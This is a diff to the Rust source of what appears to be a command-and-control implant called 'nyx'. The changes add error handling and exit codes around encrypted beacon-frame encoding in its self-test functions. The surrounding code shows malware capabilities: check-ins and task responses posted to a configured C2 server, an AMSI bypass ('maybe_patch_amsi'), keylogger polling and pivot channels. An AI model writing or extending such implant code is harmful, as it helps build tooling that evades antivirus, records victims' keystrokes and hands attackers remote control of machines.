@@ -878,7 +878,10 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // Step 4: Test mem::register_key + encode_frame (the beacon frame builder).
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
-    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, b"test_info");
+    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, b"test_info") {
+        Ok(f) => f,
+        Err(_) => unsafe { exit(0xA7) }, // encode_frame seal failure (AEAD alloc)
+    };
     // 0xA3 reached: encode_frame OK
 
     // Step 5: Test ensure_winhttp only (resolve WinHTTP fns — no network call).
@@ -925,7 +928,10 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let info_plain = iw.into_bytes();
 
     // Check-in with SessionInfo payload.
-    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain);
+    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain) {
+        Ok(f) => f,
+        Err(_) => unsafe { exit(0xB8) }, // check-in frame seal failure
+    };
     let resp = crate::transport::post_frame(
         cfg.server_host.as_bytes(),
         cfg.server_port,
@@ -953,12 +959,15 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     // 0xB4: all 3 cycle ops OK
 
     // Simulate task-loop first POST: encode empty TaskResponse batch + send.
-    let frame2 = nyx_protocol::encode_frame(
+    let frame2 = match nyx_protocol::encode_frame(
         &pubkey,
         1u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
-    );
+    ) {
+        Ok(f) => f,
+        Err(_) => unsafe { exit(0xB9) }, // task-loop frame seal failure
+    };
     let body = crate::transport::post_frame(
         cfg.server_host.as_bytes(),
         cfg.server_port,
@@ -993,12 +1002,15 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let _ = crate::blind::maybe_patch_amsi();
     crate::keylog::poll_once();
     let _ = crate::pivot::pump_channels();
-    let frame3 = nyx_protocol::encode_frame(
+    let frame3 = match nyx_protocol::encode_frame(
         &pubkey,
         2u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
-    );
+    ) {
+        Ok(f) => f,
+        Err(_) => unsafe { exit(0xBA) }, // second-cycle frame seal failure
+    };
     let body3 = crate::transport::post_frame(
         cfg.server_host.as_bytes(),
         cfg.server_port,
@@ -1071,7 +1083,10 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     let info_plain = iw.into_bytes();
 
     mk("step10_encode_frame\n");
-    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain);
+    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain) {
+        Ok(f) => f,
+        Err(_) => { mk("FAIL_encode_frame\n"); unsafe { exit(0xF9); } }
+    };
 
     mk("step11_dispatch_send_recv\n");
     let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
@@ -1089,10 +1104,13 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     crate::beacon::sleep_seconds(1);
 
     mk("step13_second_post\n");
-    let frame2 = nyx_protocol::encode_frame(
+    let frame2 = match nyx_protocol::encode_frame(
         &pubkey, 1u64, &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch"),
-    );
+    ) {
+        Ok(f) => f,
+        Err(_) => { mk("FAIL_encode_frame2\n"); unsafe { exit(0xFA); } }
+    };
     let resp2 = unsafe {
         crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame2)
     };
